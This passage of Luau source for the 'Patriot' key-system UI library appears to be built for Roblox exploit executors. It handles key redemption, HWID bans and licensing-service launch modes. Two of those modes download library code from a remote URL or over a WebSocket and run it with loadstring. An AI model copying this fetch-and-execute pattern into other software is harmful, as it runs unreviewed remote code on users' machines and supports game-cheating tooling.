        icon.Size = UDim2.new(0, 18, 0, 18)
        icon.Position = UDim2.new(0.5, 0, 0.5, 0)
        icon.AnchorPoint = Vector2.new(0.5, 0.5)
        icon.BackgroundTransparency = 1
        icon.Image = getIcon(iconKey)
        icon.ImageColor3 = Patriot.Theme.TextDim
        icon.ScaleType = Enum.ScaleType.Fit
        icon.Parent = btn

        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Patriot.Theme.SecondaryBackground}):Play()
            TweenService:Create(btnStroke, TweenInfo.new(0.2), {Transparency = 0.4}):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Patriot.Theme.Input}):Play()
            TweenService:Create(btnStroke, TweenInfo.new(0.2), {Transparency = 0.8}):Play()
        end)
        return btn, icon
    end

    local userBtn, userIcon = createBottomButton("user", -46)
    local discordBtn, discordIcon = createBottomButton("discord", 0)
    local changelogBtn, changelogIcon = createBottomButton("changelog", 46)

    discordIcon.ImageColor3 = Patriot.Theme.Discord
    discordBtn.MouseEnter:Connect(function()
        TweenService:Create(discordIcon, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.DiscordHover}):Play()
    end)
    discordBtn.MouseLeave:Connect(function()
        TweenService:Create(discordIcon, TweenInfo.new(0.15), {ImageColor3 = Patriot.Theme.Discord}):Play()
    end)

    if #Patriot.Changelog == 0 then
        changelogBtn.Visible = false
        userBtn.Position = UDim2.new(0.5, -22, 0, bottomY)
        discordBtn.Position = UDim2.new(0.5, 22, 0, bottomY)
    end

    if showShop then
        local shopDivider = Instance.new("Frame")
        shopDivider.Size = UDim2.new(1, 0, 0, shopDividerHeight)
        shopDivider.Position = UDim2.new(0, 0, 1, -shopHeight - shopDividerHeight)
        shopDivider.AnchorPoint = Vector2.new(0, 0)
        shopDivider.BackgroundColor3 = Patriot.Theme.Accent
        shopDivider.BackgroundTransparency = 0.4
        shopDivider.BorderSizePixel = 0
        shopDivider.Parent = mainFrame

        local shopFrame = Instance.new("Frame")
        shopFrame.Size = UDim2.new(1, 0, 0, shopHeight)
        shopFrame.Position = UDim2.new(0, 0, 1, -shopHeight)
        shopFrame.AnchorPoint = Vector2.new(0, 0)
        shopFrame.BackgroundColor3 = Patriot.Theme.Header
        shopFrame.BorderSizePixel = 0
        shopFrame.ClipsDescendants = true
        shopFrame.Parent = mainFrame

        local shopGradient = Instance.new("UIGradient", shopFrame)
        shopGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Patriot.Theme.Header),
            ColorSequenceKeypoint.new(1, Patriot.Theme.CardBackground)
        })

        local shopCorner = Instance.new("UICorner", shopFrame)
        shopCorner.CornerRadius = UDim.new(0, 6)

        local shopTopFix = Instance.new("Frame")
        shopTopFix.Size = UDim2.new(1, 0, 0, 8)
        shopTopFix.Position = UDim2.new(0, 0, 0, 0)
        shopTopFix.BackgroundColor3 = Patriot.Theme.Header
        shopTopFix.BorderSizePixel = 0
        shopTopFix.Parent = shopFrame

        local shopPadding = 14
        local shopIconSize = 28

        local shopIconWrapper = Instance.new("Frame")
        shopIconWrapper.Size = UDim2.new(0, shopIconSize + 4, 0, shopIconSize + 4)
        shopIconWrapper.Position = UDim2.new(0, shopPadding, 0.5, 0)
        shopIconWrapper.AnchorPoint = Vector2.new(0, 0.5)
        shopIconWrapper.BackgroundColor3 = Patriot.Theme.Accent
        shopIconWrapper.BackgroundTransparency = 0.6
        shopIconWrapper.BorderSizePixel = 0
        shopIconWrapper.Parent = shopFrame
        Instance.new("UICorner", shopIconWrapper).CornerRadius = UDim.new(0, 6)

        local shopIconStroke = Instance.new("UIStroke", shopIconWrapper)
        shopIconStroke.Color = Patriot.Theme.Accent
        shopIconStroke.Thickness = 1
        shopIconStroke.Transparency = 0.4

        local shopIconImg = Instance.new("ImageLabel")
        shopIconImg.Size = UDim2.new(0, shopIconSize, 0, shopIconSize)
        shopIconImg.Position = UDim2.new(0.5, 0, 0.5, 0)
        shopIconImg.AnchorPoint = Vector2.new(0.5, 0.5)
        shopIconImg.BackgroundTransparency = 1
        shopIconImg.Image = getShopIcon()
        shopIconImg.ImageColor3 = Patriot.Theme.Text
        shopIconImg.ScaleType = Enum.ScaleType.Fit
        shopIconImg.Parent = shopIconWrapper

        local buyBtnWidth = 60
        local textStartX = shopPadding + shopIconSize + 4 + 10
        local textAreaWidth = windowWidth - textStartX - buyBtnWidth - shopPadding - 8

        local shopTitle = Instance.new("TextLabel")
        shopTitle.Size = UDim2.new(0, textAreaWidth, 0, 18)
        shopTitle.Position = UDim2.new(0, textStartX, 0, 9)
        shopTitle.BackgroundTransparency = 1
        shopTitle.Text = Patriot.Shop.Title
        shopTitle.TextColor3 = Patriot.Theme.Text
        shopTitle.TextSize = mobile and 13 or 14
        shopTitle.Font = Enum.Font.ArimoBold
        shopTitle.TextXAlignment = Enum.TextXAlignment.Left
        shopTitle.TextTruncate = Enum.TextTruncate.AtEnd
        shopTitle.Parent = shopFrame

        local shopSubtitle = Instance.new("TextLabel")
        shopSubtitle.Size = UDim2.new(0, textAreaWidth, 0, 14)
        shopSubtitle.Position = UDim2.new(0, textStartX, 0, 29)
        shopSubtitle.BackgroundTransparency = 1
        shopSubtitle.Text = Patriot.Shop.Subtitle
        shopSubtitle.TextColor3 = Patriot.Theme.TextDim
        shopSubtitle.TextSize = mobile and 10 or 11
        shopSubtitle.Font = Enum.Font.ArimoBold
        shopSubtitle.TextXAlignment = Enum.TextXAlignment.Left
        shopSubtitle.TextTruncate = Enum.TextTruncate.AtEnd
        shopSubtitle.Parent = shopFrame

        local buyBtn = Instance.new("TextButton")
        buyBtn.Size = UDim2.new(0, buyBtnWidth, 0, 30)
        buyBtn.Position = UDim2.new(1, -shopPadding, 0.5, 0)
        buyBtn.AnchorPoint = Vector2.new(1, 0.5)
        buyBtn.BackgroundColor3 = Patriot.Theme.Accent
        buyBtn.BorderSizePixel = 0
        buyBtn.Text = ""
        buyBtn.AutoButtonColor = false
        buyBtn.Parent = shopFrame
        Instance.new("UICorner", buyBtn).CornerRadius = UDim.new(0, 6)

        local buyBtnStroke = Instance.new("UIStroke", buyBtn)
        buyBtnStroke.Color = Patriot.Theme.AccentHover
        buyBtnStroke.Thickness = 1
        buyBtnStroke.Transparency = 0.4

        local buyGradient = Instance.new("UIGradient", buyBtn)
        buyGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Patriot.Theme.Accent),
            ColorSequenceKeypoint.new(1, Patriot.Theme.AccentHover)
        })

        local buyContent = Instance.new("Frame")
        buyContent.Size = UDim2.new(1, 0, 1, 0)
        buyContent.BackgroundTransparency = 1
        buyContent.Parent = buyBtn

        local buyLayout = Instance.new("UIListLayout", buyContent)
        buyLayout.FillDirection = Enum.FillDirection.Horizontal
        buyLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        buyLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        buyLayout.Padding = UDim.new(0, 5)

        local buyIcon = Instance.new("ImageLabel")
        buyIcon.Size = UDim2.new(0, 14, 0, 14)
        buyIcon.BackgroundTransparency = 1
        buyIcon.Image = getIcon("cart")
        buyIcon.ImageColor3 = Patriot.Theme.Text
        buyIcon.ScaleType = Enum.ScaleType.Fit
        buyIcon.LayoutOrder = 1
        buyIcon.Parent = buyContent

        local buyLabel = Instance.new("TextLabel")
        buyLabel.Size = UDim2.new(0, 0, 0, 14)
        buyLabel.AutomaticSize = Enum.AutomaticSize.X
        buyLabel.BackgroundTransparency = 1
        buyLabel.Text = Patriot.Shop.ButtonText
        buyLabel.TextColor3 = Patriot.Theme.Text
        buyLabel.TextSize = mobile and 11 or 12
        buyLabel.Font = Enum.Font.ArimoBold
        buyLabel.LayoutOrder = 2
        buyLabel.Parent = buyContent

        buyBtn.MouseEnter:Connect(function()
            TweenService:Create(buyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Patriot.Theme.AccentHover}):Play()
            TweenService:Create(buyBtnStroke, TweenInfo.new(0.2), {Transparency = 0.2}):Play()
        end)
        buyBtn.MouseLeave:Connect(function()
            TweenService:Create(buyBtn, TweenInfo.new(0.2), {BackgroundColor3 = Patriot.Theme.Accent}):Play()
            TweenService:Create(buyBtnStroke, TweenInfo.new(0.2), {Transparency = 0.4}):Play()
        end)
        buyBtn.MouseButton1Click:Connect(function()
            if Patriot.Shop.Link ~= "" then
                pcall(function() setclipboard(Patriot.Shop.Link) end)
                Patriot:Notify("Shop", "Shop link copied to clipboard!", 2, "copy")
            end
        end)
    end

    local doors = CreateDoorOverlay(mainFrame, windowWidth, windowHeight)

    userBtn.MouseButton1Click:Connect(function() ui.toggleUser(userIcon) end)
    changelogBtn.MouseButton1Click:Connect(function() ui.toggleCL(changelogIcon) end)

    local spinConnection, dotsThread

    local function setStatus(state, customText)
        if spinConnection then spinConnection:Disconnect() spinConnection = nil statusIcon.Rotation = 0 end
        if dotsThread then task.cancel(dotsThread) dotsThread = nil end
        local color, icon, text = Patriot.Theme.StatusIdle, getIcon("lock"), customText or "No key detected"
        if state == "verifying" then
            color, icon, text = Patriot.Theme.Accent, getIcon("loading"), "Verifying key"
            spinConnection = RunService.Heartbeat:Connect(function(dt)
                if statusIcon and statusIcon.Parent then statusIcon.Rotation = (statusIcon.Rotation + dt * 360) % 360
                else if spinConnection then spinConnection:Disconnect() end end
            end)
            local dots, i = {".", "..", "...", ""}, 1
            dotsThread = task.spawn(function()
                while statusLabel and statusLabel.Parent and statusLabel.Text:find("Verifying", 1, true) do
                    statusLabel.Text = text .. dots[i] i = (i % #dots) + 1 task.wait(0.4)
                end
            end)
        elseif state == "success" then color, icon, text = Patriot.Theme.Success, getIcon("check"), customText or "Access Granted"
        elseif state == "error" then color, icon, text = Patriot.Theme.Error, getIcon("alert"), customText or "Invalid Key" end
        TweenService:Create(statusLabel, TweenInfo.new(0.3), {TextColor3 = color}):Play()
        TweenService:Create(statusIcon, TweenInfo.new(0.3), {ImageColor3 = color}):Play()
        TweenService:Create(statusStroke, TweenInfo.new(0.3), {Color = color}):Play()
        statusLabel.Text = text statusIcon.Image = icon
    end

    local function closeDoorsThenExit(callback)
        ui.closeAllPanels(userIcon, changelogIcon, function()
            doors.close(function() task.wait(0.35) if callback then callback() end end)
        end)
    end

    closeBtn.MouseButton1Click:Connect(function()
        Patriot:Notify("Goodbye", "Welcome to use it next time!", 2, "close")
        closeDoorsThenExit(function()
            fullCleanup()
            TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
            TweenService:Create(mainFrame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
            task.wait(0.5) screenGui:Destroy()
            if Patriot.Callbacks.OnClose then Patriot.Callbacks.OnClose() end
        end)
    end)

    local function handleRedeem()
        local key = textBox.Text:gsub("%s+", "")
        if key == "" then Patriot:Notify("Error", "Please enter your key", 3, "warning") return end
        setStatus("verifying") redeemBtn.Active = false task.wait(0.3)
        local valid, errorMsg = false, "Invalid key"
        if Internal.ValidateFunction then
            local success, result, msg = pcall(Internal.ValidateFunction, key)
            if success then
                if type(result) == "table" then
                    valid = result.valid == true
                    local errMsgs = {
                        KEY_INVALID = "Key not found in system", KEY_EXPIRED = "Key has expired",
                        HWID_BANNED = "Hardware banned", KEY_INVALIDATED = "Key was revoked",
                        ALREADY_USED = "One-time key already used", HWID_MISMATCH = "HWID limit reached",
                        SERVICE_NOT_FOUND = "Service not found", SERVICE_MISMATCH = "Wrong service",
                        PREMIUM_REQUIRED = "Premium required", ERROR = "Network error"
                    }
                    local errCode = result.error or "Unknown"
                    errorMsg = errMsgs[errCode] or result.message or errCode
                    if errCode == "HWID_BANNED" then task.delay(2, function() cloneref(Players.LocalPlayer):Kick("Hardware banned") end) end
                elseif type(result) == "boolean" then valid = result errorMsg = msg or "Invalid key" end
            end
        end
        redeemBtn.Active = true
        if valid then
            saveKey(key) getgenv().SCRIPT_KEY = key getgenv().PatriotLoaded = false
            setStatus("success") Patriot:Notify("Success", "Key validated successfully!", 2, "success") task.wait(1)
            closeDoorsThenExit(function()
                disableBlur()
                TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, -0.5, 0)}):Play()
                TweenService:Create(mainFrame, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
                task.wait(0.5) screenGui:Destroy()
                if not Internal.IsJunkieMode and not Internal.IsWilkinsMode and Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
            end)
        else
            setStatus("error", errorMsg) Patriot:Notify("Invalid", errorMsg, 4, "error")
            if Patriot.Callbacks.OnFail then Patriot.Callbacks.OnFail(errorMsg) end
        end
    end

    redeemBtn.MouseButton1Click:Connect(handleRedeem)
    acquireBtn.MouseButton1Click:Connect(function()
        if Patriot.Links.GetKey ~= "" then Patriot:Notify("Copied", "Key link copied!", 3, "copy") pcall(function() setclipboard(Patriot.Links.GetKey) end)
        else Patriot:Notify("Error", "No key link set", 3, "warning") end
    end)
    discordBtn.MouseButton1Click:Connect(function()
        if Patriot.Links.Discord ~= "" then Patriot:Notify("Discord", "Invite link copied!", 2, "discord") pcall(function() setclipboard(Patriot.Links.Discord) end) end
    end)
    textBox.FocusLost:Connect(function(enter) if enter then handleRedeem() end end)

    setupDragging(header, container)
    TweenService:Create(container, TweenInfo.new(0.6, Enum.EasingStyle.Quart), {Position = UDim2.new(0.5, 0, 0.45, 0)}):Play()
    task.wait(0.7)
    doors.open(function()
        task.wait(0.25)
        ui.toggleUser(userIcon)
        if #Patriot.Changelog > 0 then task.wait(0.35) ui.toggleCL(changelogIcon) end
    end)
end

function Patriot:Launch()
    Internal.IsJunkieMode = false
    Internal.IsWilkinsMode = false
    Internal.ValidateFunction = Patriot.Callbacks.OnVerify
    local existingKey = getgenv().SCRIPT_KEY
    if existingKey and existingKey ~= "" then
        if existingKey == "KEYLESS" then
            Patriot:Notify("Executed", "Script loaded successfully!", 2, "success")
            if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
        elseif Internal.ValidateFunction and validateKey(existingKey, Internal.ValidateFunction) then
            Patriot:Notify("Executed", "Script loaded successfully!", 2, "success")
            if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
        end
        getgenv().SCRIPT_KEY = nil
    end
    getgenv().PatriotClosed = false
    EnsureIconsReady(function()
        if Patriot.Options.Keyless == true then
            if Patriot.Options.KeylessUI == false then handleKeylessSkip() return end
            BuildKeylessUI()
            while not getgenv().SCRIPT_KEY do task.wait(0.1) end
            return
        end
        if Patriot.Storage.AutoLoad and Internal.ValidateFunction then
            local savedKey = loadKey()
            if savedKey and savedKey ~= "" then
                Patriot:Notify("Checking", "Validating saved key...", 2, "shield") task.wait(0.5)
                if validateKey(savedKey, Internal.ValidateFunction) then
                    getgenv().SCRIPT_KEY = savedKey
                    Patriot:Notify("Welcome Back", "Key validated!", 2, "success")
                    if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
                else clearKey() Patriot:Notify("Expired", "Saved key is no longer valid", 3, "warning") task.wait(1) end
            end
        end
        BuildKeyUI()
        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
    end)
end

function Patriot:LaunchJunkie(config)
    assert(config and config.Service and config.Identifier and config.Provider, "Config required: Service, Identifier, Provider")
    Internal.IsJunkieMode = true
    Internal.IsWilkinsMode = false
    local existingKey = getgenv().SCRIPT_KEY
    if existingKey and existingKey ~= "" then
        Patriot:Notify("Executed", "Script loaded successfully!", 2, "success")
        if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
    end
    getgenv().PatriotClosed = false
    EnsureIconsReady(function()
        local success, Junkie = pcall(function() return loadstring(game:HttpGet("https://jnkie.com/sdk/library.lua"))() end)
        if not success or not Junkie then Patriot:Notify("Error", "Failed to load Junkie SDK", 5, "error") return end
        Junkie.service = config.Service
        Junkie.identifier = config.Identifier
        Junkie.provider = config.Provider
        Internal.Junkie = Junkie
        if Patriot.Links.GetKey == "" then pcall(function() Patriot.Links.GetKey = Junkie.get_key_link() end) end
        Internal.ValidateFunction = function(key) return Junkie.check_key(key) end
        if Patriot.Options.Keyless == nil then
            local ks, kr = pcall(function() return Junkie.check_key("KEYLESS") end)
            if ks and kr and kr.valid then
                if Patriot.Options.KeylessUI == false then handleKeylessSkip() return end
                BuildKeylessUI()
                while not getgenv().SCRIPT_KEY do task.wait(0.1) end
                return
            end
        elseif Patriot.Options.Keyless == true then
            if Patriot.Options.KeylessUI == false then handleKeylessSkip() return end
            BuildKeylessUI()
            while not getgenv().SCRIPT_KEY do task.wait(0.1) end
            return
        end
        if Patriot.Storage.AutoLoad then
            local savedKey = loadKey()
            if savedKey and savedKey ~= "" then
                Patriot:Notify("Checking", "Validating saved key...", 2, "shield") task.wait(0.5)
                local vs, vr = pcall(function() return Junkie.check_key(savedKey) end)
                if vs and vr and vr.valid then
                    getgenv().SCRIPT_KEY = savedKey
                    Patriot:Notify("Welcome Back", "Key validated!", 2, "success")
                    if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
                else clearKey() Patriot:Notify("Expired", "Saved key is no longer valid", 3, "warning") task.wait(1) end
            end
        end
        BuildKeyUI()
        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
    end)
end

function Patriot:LaunchWilkins(config)
    assert(config and config.serviceId, "Config required: serviceId")
    Internal.IsJunkieMode = false
    Internal.IsWilkinsMode = true
    local existingKey = getgenv().SCRIPT_KEY
    if existingKey and existingKey ~= "" then
        Patriot:Notify("Executed", "Script loaded successfully!", 2, "success")
        if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end return
    end
    getgenv().PatriotClosed = false
    EnsureIconsReady(function()
       
        local wsCtor = (WebSocket and WebSocket.connect)
            or (syn and syn.websocket and syn.websocket.connect)
            or (websocket and websocket.connect)
        
        if not wsCtor then
            Patriot:Notify("Error", "Executor does not support WebSocket", 5, "error")
            return
        end

 
        local libCode
        do
            local ws = wsCtor("wss://secure.pandauth.com/ws?type=wilkins-lib")
            ws.OnMessage:Connect(function(msg)
                if msg and #msg > 0 and not libCode then libCode = msg end
            end)
            local deadline = tick() + 15
            repeat task.wait(0.05) until libCode or tick() > deadline
            pcall(function() ws:Close() end)
        end

        if not libCode then
            Patriot:Notify("Error", "Failed to fetch Wilkins library (timeout)", 5, "error")
            return
        end

      
        local Wilkins = loadstring(libCode)()
        if not Wilkins or type(Wilkins.configure) ~= "function" then
            Patriot:Notify("Error", "Wilkins library failed to initialize", 5, "error")
            return
        end

     
        local wilkinsConfig = {
            serviceId = config.serviceId,
            debug = config.debug or false,
            kickOnDetect = config.kickOnDetect or false,
            openDashboard = config.openDashboard ~= nil and config.openDashboard or true,
            validationTimeout = config.validationTimeout or 600,
            onTamper = config.onTamper or function(flags)
                warn("[Wilkins] Server flagged tamper:", table.concat(flags or {}, ","))
            end,
            onSessionEnd = config.onSessionEnd or function(reason, msg)
                warn("[Wilkins] Session ended:", reason, msg or "")
            end,
        }
        Wilkins.configure(wilkinsConfig)
        Internal.Wilkins = Wilkins

        
        Internal.ValidateFunction = function(key)
            local result = Wilkins.validate(key)
            if result and result.success then
                return {valid = true}
            else
                return {valid = false, error = result and result.error or "Unknown error"}
            end
        end

        
        if Patriot.Links.GetKey == "" then
            pcall(function()
                local info = Wilkins.copyGetKeyUrl()
                if info and info.url then
                    Patriot.Links.GetKey = info.url
                end
            end)
        end

    
        if Patriot.Options.Keyless == nil then
            local keylessResult = Wilkins.validate("KEYLESS")
            if keylessResult and keylessResult.success then
                if Patriot.Options.KeylessUI == false then
                    handleKeylessSkip()
              
                    task.spawn(function()
                        while Wilkins.isConnected() do task.wait(5) end
                    end)
                    return
                end
                BuildKeylessUI()
                while not getgenv().SCRIPT_KEY do task.wait(0.1) end
              
                task.spawn(function()
                    while Wilkins.isConnected() do task.wait(5) end
                end)
                return
            end
        elseif Patriot.Options.Keyless == true then
            if Patriot.Options.KeylessUI == false then
                handleKeylessSkip()
                task.spawn(function()
                    while Wilkins.isConnected() do task.wait(5) end
                end)
                return
            end
            BuildKeylessUI()
            while not getgenv().SCRIPT_KEY do task.wait(0.1) end
            task.spawn(function()
                while Wilkins.isConnected() do task.wait(5) end
            end)
            return
        end

       
        if Patriot.Storage.AutoLoad then
            local savedKey = Wilkins.loadSavedKey() or loadKey()
            if savedKey and savedKey ~= "" then
                Patriot:Notify("Checking", "Validating saved key...", 2, "shield")
                task.wait(0.5)
                local result = Wilkins.validate(savedKey)
                if result and result.success then
                    getgenv().SCRIPT_KEY = savedKey
                    Patriot:Notify("Welcome Back", "Key validated!", 2, "success")
                    task.spawn(function()
                        while Wilkins.isConnected() do task.wait(5) end
                    end)
                    if Patriot.Callbacks.OnSuccess then Patriot.Callbacks.OnSuccess() end
                    return
                else
                    Wilkins.clearSavedKey()
                    clearKey()
                    Patriot:Notify("Expired", "Saved key is no longer valid", 3, "warning")
                    task.wait(1)
                end
            end
        end

   
        BuildKeyUI()
        while not getgenv().SCRIPT_KEY do task.wait(0.1) end
        
       
        task.spawn(function()
            while Internal.Wilkins and Internal.Wilkins.isConnected() do
                task.wait(5)
            end
        end)
    end)
end

function Patriot:GetSavedKey()
    if Internal.IsWilkinsMode and Internal.Wilkins then
        return Internal.Wilkins.loadSavedKey() or loadKey()
    end
    return loadKey()
end

function Patriot:ClearSavedKey()
    if Internal.IsWilkinsMode and Internal.Wilkins then
        Internal.Wilkins.clearSavedKey()
    end
    return clearKey()
end

getgenv().Patriot = Patriot
return Patriot